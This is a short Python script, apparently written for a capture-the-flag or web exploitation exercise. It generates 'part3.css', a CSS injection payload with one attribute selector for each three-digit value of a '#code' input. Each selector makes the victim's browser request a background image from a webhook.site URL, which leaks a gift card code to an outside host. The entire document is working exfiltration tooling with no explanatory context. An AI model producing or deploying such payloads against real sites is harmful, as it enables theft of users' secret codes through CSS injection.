payload = ""
url = "https://webhook.site/3f7ed285-f2d9-46af-9071-472b67be53ff?giftCard="

for i in range(0, 1000):
    payload += f"#code[value='{i:03}']{{background-image: url('{url}{i:03}')}}\n"

with open("part3.css", "w") as f:
    f.write(payload)